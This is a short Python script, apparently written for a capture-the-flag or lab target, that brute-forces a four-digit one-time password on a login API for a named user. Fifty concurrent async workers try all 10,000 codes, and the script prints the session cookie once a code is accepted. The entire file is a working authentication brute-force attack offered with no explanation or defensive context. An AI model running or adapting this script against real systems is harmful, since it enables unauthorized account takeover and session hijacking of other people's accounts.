import asyncio
import aiohttp
import sys

URL = "http://154.57.164.82:31813/api/auth/loginOtp"
USERNAME = "voidweaver"


async def attempt_otp(session, otp_str):
    payload = {"username": USERNAME, "otp": otp_str}
    try:
        async with session.post(URL, json=payload) as resp:
            text = await resp.text()
            if resp.status == 200:
                print(
                    f"Success! OTP: {otp_str} | Cookie: {resp.cookies.get('session')} | Response: {text}"
                )
                # Save cookie to file
                for c in resp.cookies.values():
                    print(f"Set-Cookie: {c.key}={c.value}")
                return otp_str
    except Exception as e:
        pass
    return None


async def worker(queue, session):
    while True:
        otp = await queue.get()
        res = await attempt_otp(session, str(otp).zfill(4))
        if res:
            print(f"Found OTP: {res}")
            # Empty queue
            while not queue.empty():
                queue.get_nowait()
                queue.task_done()
        queue.task_done()


async def main():
    queue = asyncio.Queue()
    for i in range(10000):
        queue.put_nowait(i)

    async with aiohttp.ClientSession() as session:
        workers = [asyncio.create_task(worker(queue, session)) for _ in range(50)]
        await queue.join()
        for w in workers:
            w.cancel()


if __name__ == "__main__":
    asyncio.run(main())
